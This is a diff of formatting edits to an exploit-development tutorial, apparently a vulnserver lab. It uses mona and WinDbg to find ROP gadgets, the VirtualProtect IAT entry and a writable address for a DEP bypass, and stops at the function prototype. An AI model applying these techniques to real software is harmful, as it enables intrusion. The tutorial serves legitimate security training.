@@ -116,7 +116,7 @@ This is where the real work begins. To build our ROP chain, we need to find smal
 
 ### 3.1 Finding Base ROP Gadgets
 
-1. First, identify non-ASLR modules:
+1. First, lets identify non-ASLR modules:
 ```
 !py mona modules
 ```
@@ -176,16 +176,14 @@ Output:
 ```
 !py mona find -type instr -s "xchg eax, edx # ret" -m "ntdll" -cpb "\x00"
 ```
-
 Output:
 ```
 0x77d9e6c0 : xchg eax, edx | ret | {PAGE_EXECUTE_READ} [ntdll.dll]
 ```
-   
+3. Find gadgets for setting "neg eax, ret" registers:
 ```
 !py mona find -type instr -s "neg eax # ret" -m "kernel32" -cpb "\x00"
 ```
-   
 Output:
 ```
 0x76505808 : neg eax | ret | {PAGE_EXECUTE_READ} [KERNEL32.dll]
@@ -196,9 +194,9 @@ Output:
 To bypass DEP, we'll use Windows' VirtualProtect function to change memory permissions. First, we need to find its address in the Import Address Table (IAT):
 
 1. Examine the IAT and search for VirtualProtect:
-   ```
-   !dh essfunc -f
-   ```
+```
+!dh essfunc -f
+```
    
 Output:
        
@@ -226,7 +224,7 @@ Output:
 dps essfunc+0x6000 L100
 ```
    
-   Output:
+Output:
 ```
  62506090  764cb3a0 KERNEL32!AddAtomA
  62506094  764cb860 KERNEL32!FindAtomA
@@ -236,14 +234,14 @@ dps essfunc+0x6000 L100
 ```
 
 3. Verify this is the correct function:
-   ```
-   dd 0x6250609c L1
-   u poi(0x6250609c)
-   ```
+```
+dd 0x6250609c L1
+u poi(0x6250609c)
+```
    
-   Output:
-       
-   ```
+Output:
+    
+```
 764d6570 8bff            mov     edi,edi
 764d6572 55              push    ebp
 764d6573 8bec            mov     ebp,esp
@@ -253,22 +251,22 @@ KERNEL32!AppModelPolicy_GetPolicy_Internal:
 764d657c 8bff            mov     edi,edi
 764d657e 55              push    ebp
 764d657f 8bec            mov     ebp,esp
-
-   ```
+```
 
 We've confirmed 0x6250609c is the IAT entry for VirtualProtect.
+
 
 ## 5. Finding a Writable Memory Region
 
 For the VirtualProtect call, we need a writable memory location to store the old protection value:
 
 1. Search for writable memory:
-   ```
-   !dh essfunc
-   ```
+```
+!dh essfunc
+```
    
-   Output:
-   ```
+Output:
+```
 SECTION HEADER #6
   .idata name
      224 virtual size
@@ -284,25 +282,25 @@ C0300040 flags
          4 byte align
          Read Write
 
-   ```
+```
 
 2. Calculate the address:
-   ```
-   ? essfunc + 0x6000 + 0x228
-   ```
+```
+? essfunc + 0x6000 + 0x228
+```
    
-   Output:
-   ```
-   Evaluate expression: 1649434664 = 62506228
-   ```
+Output:
+```
+Evaluate expression: 1649434664 = 62506228
+```
 
 3. Verify the address is writable:
-   ```
-   !vprot 0x62506228
-   ```
+```
+!vprot 0x62506228
+```
    
-   Output:
-   ```
+Output:
+```
 BaseAddress:       62506000
 AllocationBase:    62500000
 AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
@@ -310,8 +308,7 @@ RegionSize:        00001000
 State:             00001000  MEM_COMMIT
 Protect:           00000004  PAGE_READWRITE
 Type:              01000000  MEM_IMAGE
-
-   ```
+```
 
 We'll use 0x62506228 as our writable memory address.
 
@@ -319,7 +316,7 @@ We'll use 0x62506228 as our writable memory address.
 
 Now we'll build our ROP chain to call VirtualProtect. Here's the function prototype:
 
-```c
+```
 BOOL VirtualProtect(
   LPVOID lpAddress,      // [ESP+4]  (Memory address to modify)
   SIZE_T dwSize,         // [ESP+8]  (Size of region)
